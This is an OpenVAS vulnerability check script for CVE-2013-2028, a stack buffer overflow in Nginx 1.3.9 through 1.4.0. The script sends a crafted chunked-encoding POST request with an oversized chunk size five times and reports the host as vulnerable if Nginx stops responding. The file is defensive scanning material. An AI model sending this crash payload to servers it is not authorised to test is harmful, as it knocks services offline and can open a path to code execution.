###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nginx_http_parse_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Nginx Chunked Transfer Encoding Stack Based Buffer Overflow Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote unauthenticated attackers
  to cause a buffer overflow, resulting in a denial of service or potentially
  allowing the execution of arbitrary code.
  Impact Level: System/Application";

tag_affected = "Nginx version 1.3.9 through 1.4.0";
tag_insight = "A stack-based buffer overflow will occur in a worker process while handling
  certain chunked transfer encoding requests.";
tag_solution = "Upgrade to Nginx version 1.5.0, 1.4.1 or later,
  http://nginx.org/";
tag_summary = "The host is running Nginx and is prone stack buffer overflow
  vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802052";
CPE = "cpe:/a:nginx:nginx";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-2028");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-05-21 11:44:36 +0530 (Tue, 21 May 2013)");
  script_name("Nginx Chunked Transfer Encoding Stack Based Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/25499");
  script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2013/q2/291");
  script_xref(name : "URL" , value : "http://mailman.nginx.org/pipermail/nginx-announce/2013/000112.html");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121675");
  script_summary("Check if Nginx is vulnerable to BoF");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl", "nginx_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_mandatory_keys("nginx/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");

## Variable Initialization
port = 0;
banner = "";
bad_req = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  port = 80;
}

if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: nginx" >!< banner){
  exit(0);
}

## Get host name
host = get_host_name();
if(!host){
  exit(0);
}

## Confirm HTTP server is alive before killing ;)
if(http_is_dead(port:port)) exit(0);

## Construct crafted chunked transfer encoding request
bad_req = string("POST / HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: OpenVAS Agent\r\n",
                 "Accept-Encoding: identity\r\n",
                 "Accept: */*\r\n",
                 "Transfer-Encoding: chunked\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n", "\r\n",
                 "FFFFFFFFFFFFFFED\r\n",
                 "Open Test\r\n",
                 "0\r\n", "\r\n");

## Send crafted chunked transfer encoding multiple times
## and check is Nginx is dead
for(i=0; i<5; i++)
{
  http_send_recv(port:port, data:bad_req);
  if(http_is_dead(port:port))
  {
    security_hole(port);
    exit(0);
  }
}
